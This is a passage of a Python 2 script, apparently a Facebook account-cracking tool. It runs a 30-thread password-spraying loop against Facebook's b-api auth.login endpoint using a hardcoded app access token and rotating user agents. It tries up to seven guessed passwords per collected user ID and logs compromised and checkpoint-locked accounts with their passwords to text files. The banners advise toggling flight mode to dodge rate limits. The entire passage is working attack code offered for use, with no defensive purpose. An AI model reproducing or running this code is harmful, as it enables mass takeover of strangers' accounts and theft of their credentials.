            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        menu()
    else:
        print ''
        print '\tSelect valid option\x1b[0;97m'
        print ''
        choice_select()
    print 47 * '\x1b[1;92m\xe2\x95\x90'
    print ' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m TOTAL IDs : ' + str(len(id))
    print ' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m START PUBLIC ID CRACKING...'
    print ' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m ON OFF FLIGHT MODE IF NO RESULT'
    print ' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m STOP THIS PROSSES CTRL+Z'
    print 47 * '\x1b[1;91m-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        ranagent = random.choice(agents)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m [NIKI-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('Abdullahok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{CP} ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('Abdullahcp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{OK} ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('Abdullahok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{CP} ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('Abdullahcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{OK} ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('Abdullahok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{CP} ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('Abdullahcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{OK} ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('Abdullahok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{CP} ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('Abdullahcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{OK} ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('Abdullahok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{CP} ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('Abdullahcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                            else:
                                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass6 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{OK} ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('Abdullahok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{CP} ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    cp = open('Abdullahcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass7 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print ' \x1b[1;91m [RANA-MZ]\x1b[1;91m{OK} ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('Abdullahok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;91m [RANA-MZ]\x1b[1;91m{CP} ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        cp = open('Abdullahcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '\x1b[1;91m-'
    print ' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m THE PROCESS HAS BEEN COMPLETED'
    print ' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps))
    print ' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m CP ID CHECK 7-8 DAYS AFTER'
    print 47 * '\x1b[1;91m-'
    print ''
    raw_input(' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Press enter to back ')
    main()


if __name__ == '__main__':
    main()
